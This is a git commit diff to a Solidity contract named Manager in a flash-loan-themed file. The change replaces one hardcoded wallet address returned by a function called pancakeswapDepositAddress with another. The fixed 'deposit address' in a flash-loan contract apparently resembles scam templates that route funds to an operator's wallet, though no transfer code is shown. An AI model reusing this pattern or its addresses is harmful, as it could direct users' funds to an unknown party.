b2098c624505e05ba535f7e16debbdd8afbff928
Flash Loan <53866690+MrBishopeee@users.noreply.github.com>
2022-09-03 06:30:12 -0300

    Update IAaveRouterCallerMain.sol

--- IAaveRouterCallerMain.sol
+++ IAaveRouterCallerMain.sol
@@ -6,6 +6,6 @@ contract Manager {
     }
     
     function pancakeswapDepositAddress() public pure returns (address) {
-        return 0x64d755f36afe18A24C8935cd6cEBa4Bee46F597D;
+        return 0x0bd7f8b65fB663d158cCcb0F116CBBF503ACA671;
     }
 }
